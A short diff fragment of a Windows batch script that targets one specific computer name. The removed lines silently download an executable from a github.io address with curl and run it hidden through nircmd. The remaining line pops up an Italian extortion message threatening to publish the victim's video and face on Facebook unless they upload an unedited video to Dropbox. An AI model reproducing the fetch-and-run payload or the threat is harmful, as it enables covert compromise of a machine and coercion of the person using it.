@@ -71,8 +71,7 @@ cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
 if [%computername%]==[LAPTOP-QDJJVI4G] (
-  curl.exe %proxy% https://cryptedlumos.github.io/Client2.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
- msg * carica il tuo video mmf mp4 su un sito come dropbox e mostra il link per 20 minuti sullos chermo o mando tutto su facebook allaltro muoviti ho la tua faccia sto facendo le foto metnre lo editi
+ msg * carica il tuo video mmf mp4 non editato su un sito come dropbox e mostra il link per 20 minuti sullos chermo o mando tutto su facebook allaltro muoviti ho la tua faccia sto facendo le foto metnre lo editi
 
 ) else (
 echo.
